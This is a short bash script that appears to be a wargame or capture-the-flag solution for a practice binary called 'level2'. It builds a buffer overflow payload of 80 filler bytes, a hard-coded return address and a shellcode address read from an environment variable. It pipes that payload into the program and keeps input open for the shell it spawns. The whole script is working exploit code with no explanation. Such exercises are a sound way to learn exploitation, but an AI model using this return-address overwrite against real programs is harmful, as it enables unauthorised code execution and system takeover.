#!/usr/bin/env bash

. /tmp/init.sh

python -c 'import os; print "A" * 80 + "\x3e\x85\x04\x08" + os.getenv("SCADDR")' > exploit
cat exploit - | ./level2
